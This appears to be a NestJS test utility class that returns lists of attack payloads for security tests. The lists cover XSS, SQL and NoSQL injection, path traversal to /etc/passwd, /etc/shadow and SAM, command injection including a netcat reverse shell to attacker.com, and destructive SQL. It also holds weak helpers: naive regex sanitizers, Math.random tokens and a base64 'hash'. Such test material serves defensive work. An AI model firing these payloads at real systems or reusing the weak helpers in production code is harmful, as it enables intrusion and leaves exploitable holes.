import { Injectable } from '@nestjs/common';

@Injectable()
export class SecurityTestUtils {
  generateXssPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS')>",
      "<a href='javascript:alert(1)'>click</a>"
    ];
  }

  generateSqlInjectionPayloads(): string[] {
    return [
      "1' OR '1'='1",
      "1; DROP TABLE users;--",
      "1' UNION SELECT * FROM users--",
      "' OR 1=1--",
      "1' AND 1=1--",
      "1' OR '1'='1'--"
    ];
  }

  generateNoSqlInjectionPayloads(): any[] {
    return [
      { "$ne": null },
      { "$gt": "" },
      { "$exists": true },
      { "$where": "this.password.length > 0" }
    ];
  }

  generatePathTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ];
  }

  generateCommandInjectionPayloads(): string[] {
    return [
      "; cat /etc/passwd",
      "| whoami",
      "`id`",
      "$(uname -a)",
      "&& ls -la"
    ];
  }

  generateJwtPayloads(): any[] {
    return [
      { alg: 'none', typ: 'JWT' },
      { alg: 'HS256', typ: 'JWT' },
      { alg: 'RS256', typ: 'JWT' }
    ];
  }

  sanitizeInput(input: string): string {
    return input
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;')
      .replace(/DROP TABLE/i, '')
      .replace(/\.\.\//g, '')
      .replace(/\{\{/g, '')
      .replace(/\$\{jndi:/gi, '');
  }

  validatePasswordStrength(password: string): { isValid: boolean; errors: string[] } {
    const errors: string[] = [];

    if (password.length < 8) {
      errors.push('Password must be at least 8 characters long');
    }
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain at least one uppercase letter');
    }
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain at least one lowercase letter');
    }
    if (!/[0-9]/.test(password)) {
      errors.push('Password must contain at least one number');
    }
    if (!/[!@#$%^&*]/.test(password)) {
      errors.push('Password must contain at least one special character');
    }

    return {
      isValid: errors.length === 0,
      errors
    };
  }

  encodeBase64(input: string): string {
    return Buffer.from(input).toString('base64');
  }

  decodeBase64(input: string): string {
    return Buffer.from(input, 'base64').toString('utf-8');
  }

  generateRandomToken(length: number = 32): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  hashSensitiveData(data: string): string {
    // Simple hash simulation for testing
    return `hashed_${Buffer.from(data).toString('base64')}`;
  }

  maskSensitiveData(data: string, visibleChars: number = 4): string {
    if (data.length <= visibleChars * 2) {
      return '*'.repeat(data.length);
    }
    return data.slice(0, visibleChars) + '*'.repeat(data.length - visibleChars * 2) + data.slice(-visibleChars);
  }

  getMaliciousPayloads(): any {
    return {
      sqlInjection: [
        "1' OR '1'='1",
        "1; DROP TABLE users;--",
        "1' UNION SELECT * FROM users--",
        "' OR 1=1--",
        "1' AND 1=1--",
        "1' OR '1'='1'--",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "1' UNION SELECT username,password FROM users--",
        "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
        "1' OR '1'='1' LIMIT 1;--",
        "'; DELETE FROM users; --",
        "1' AND 1=1; EXEC xp_cmdshell 'dir'; --"
      ],
      xss: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS')>",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<form action=javascript:alert('XSS')>",
        "<button onclick=alert('XSS')>click</button>"
      ],
      csrf: [
        { method: 'POST', body: { action: 'transfer', amount: 1000 } },
        { method: 'PUT', body: { email: 'attacker@evil.com' } },
        { method: 'DELETE', body: {} }
      ],
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\win.ini"
      ],
      commandInjection: [
        "; cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(uname -a)",
        "&& ls -la",
        "|| ping -c 1 127.0.0.1",
        "; nc -e /bin/sh attacker.com 1234",
        "| powershell -Command "
      ]
    };
  }

  validateSecurityHeaders(response: any): { isValid: boolean; missing: string[]; missingHeaders: string[] } {
    const required = ['content-security-policy', 'x-frame-options', 'x-content-type-options', 'strict-transport-security'];
    const headers = response?.headers || {};
    const missing = required.filter(h => !headers[h]);

    return {
      isValid: missing.length === 0,
      missing,
      missingHeaders: missing
    };
  }

  analyzeRequestPatterns(requests: any[]): { isSuspicious: boolean; score: number; reasons: string[]; suspiciousIps: string[] } {
    const reasons: string[] = [];
    let score = 0;
    const suspiciousIps: string[] = [];

    // Check each request's requestCount property (used by the test)
    for (const req of requests) {
      const ip = req.ip;
      const requestCount = req.requestCount || 0;
      
      if (ip && requestCount >= 50) {
        suspiciousIps.push(ip);
        score += 20;
      }
    }

    if (suspiciousIps.length > 0) {
      reasons.push('Suspicious IP patterns detected');
    }

    if (requests.length > 100) {
      score += 30;
      reasons.push('High request volume');
    }

    return {
      isSuspicious: score > 50,
      score,
      reasons,
      suspiciousIps
    };
  }

  validateFileUpload(file: any): { isValid: boolean; errors: string[]; reason?: string } {
    const errors: string[] = [];

    if (file?.size > 10 * 1024 * 1024) {
      errors.push('File too large');
    }

    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    // Check 'mimeType' (capital T as used in tests), 'type', and 'mimetype' properties
    const fileType = file?.mimeType || file?.type || file?.mimetype;
    if (!allowedTypes.includes(fileType)) {
      errors.push('Invalid file type');
    }

    return {
      isValid: errors.length === 0,
      errors,
      reason: errors.length > 0 ? errors[0] : undefined
    };
  }

  generateSecurityTestData(): any {
    return {
      validUsers: [
        { id: 'user-1', email: 'test@example.com', role: 'user' },
        { id: 'user-2', email: 'admin@example.com', role: 'admin' }
      ],
      invalidUsers: [
        { id: '', email: 'invalid', role: 'unknown' }
      ],
      maliciousPayloads: this.getMaliciousPayloads(),
      testTokens: ['token1', 'token2', 'token3'],
      testApiKeys: ['api-key-1', 'api-key-2', 'api-key-3']
    };
  }

  sanitizeUrl(url: string): string {
    // Remove potentially dangerous protocols
    return url
      .replace(/javascript:/gi, '')
      .replace(/data:/gi, '')
      .replace(/vbscript:/gi, '');
  }

  sanitizeCss(css: string): string {
    // Remove dangerous CSS expressions and behaviors
    return css
      .replace(/expression\s*\(/gi, '')
      .replace(/behavior\s*:/gi, '');
  }

  sanitizeHtml(input: string): string {
    return input
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  sanitizeEvents(input: string): string {
    return input.replace(/on\w+\s*=/gi, '');
  }
}
